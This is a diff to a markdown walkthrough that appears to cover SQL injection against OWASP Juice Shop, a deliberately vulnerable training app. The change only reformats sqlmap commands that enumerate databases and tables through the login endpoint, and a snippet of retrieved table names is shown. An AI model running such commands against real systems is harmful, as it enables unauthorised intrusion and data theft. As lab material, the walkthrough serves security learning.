@@ -4,24 +4,20 @@ It's more effective when you set some default values. It increases the performan
 
 ## Retrieve the databases
 
-```
-sqlmap -u 'juice-shop.herokuapp.com/rest/user/login' --data="email=test@test.com&password=test" --level
-
-5 --risk 3 -f --banner --ignore-code 401 --dbs
+```bash
+sqlmap -u 'juice-shop.herokuapp.com/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbs
 ```
 
 
 ## Retrieve the tables
 
-```
-sqlmap -u 'juice-shop.herokuapp.com/rest/user/login' --data="email=test@test.com&password=test" --level
-
-5 --risk 3 -f --banner --ignore-code 401 --tables
+```bash
+sqlmap -u 'juice-shop.herokuapp.com/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --tables
 ```
 
 Here is the result
 
-```
+```bash
 ...
 [21:51:47] [INFO] retrieved: Quantities
 [21:52:00] [INFO] retrieved: Recycles
